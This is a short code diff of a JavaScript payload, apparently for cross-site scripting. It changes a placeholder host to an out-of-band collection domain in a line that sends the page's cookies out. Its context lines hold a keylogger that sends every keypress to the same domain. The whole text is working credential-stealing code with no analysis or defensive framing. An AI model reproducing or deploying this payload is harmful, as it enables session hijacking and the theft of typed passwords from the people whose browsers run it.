@@ -1,4 +1,4 @@
-fetch('https://yourserver.com/log?cookie=' + document.cookie);
+fetch('https://gtszayijeuhquctbmohmzogwtpzcsuspe.oast.fun/log?cookie=' + document.cookie);
 document.onkeypress = function(e) {
     fetch('https://gtszayijeuhquctbmohmzogwtpzcsuspe.oast.fun/keylog?key=' + encodeURIComponent(e.key));
 };
